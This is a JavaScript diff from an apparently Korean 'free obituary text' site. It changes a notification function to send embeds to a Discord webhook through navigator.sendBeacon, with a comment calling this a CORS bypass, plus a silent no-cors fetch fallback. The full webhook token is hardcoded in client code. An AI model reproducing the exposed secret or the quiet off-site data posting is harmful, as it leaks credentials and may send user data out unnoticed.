@@ -4,16 +4,26 @@ let currentStep = 1;
 // ===== Discord 웹훅 =====
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1457406206602776741/A-dGhbpVt6HzwSNJVguZ1OLf-ngkyO1NkucsW_aE8p4sIa_b_CG93Cbf-FKjDZWf7ZMS';
 
-async function sendDiscordNotification(embed) {
+function sendDiscordNotification(embed) {
     try {
-        await fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                username: '부고문자무료발송',
-                embeds: [embed]
-            })
+        const payload = JSON.stringify({
+            username: '부고문자무료발송',
+            embeds: [embed]
         });
+
+        // navigator.sendBeacon으로 먼저 시도 (CORS 우회)
+        const blob = new Blob([payload], { type: 'application/json' });
+        const sent = navigator.sendBeacon(DISCORD_WEBHOOK, blob);
+
+        // sendBeacon 실패 시 fetch no-cors 모드로 시도
+        if (!sent) {
+            fetch(DISCORD_WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: payload,
+                mode: 'no-cors'
+            }).catch(() => {});
+        }
     } catch (e) {
         // 알림 실패해도 무시
     }
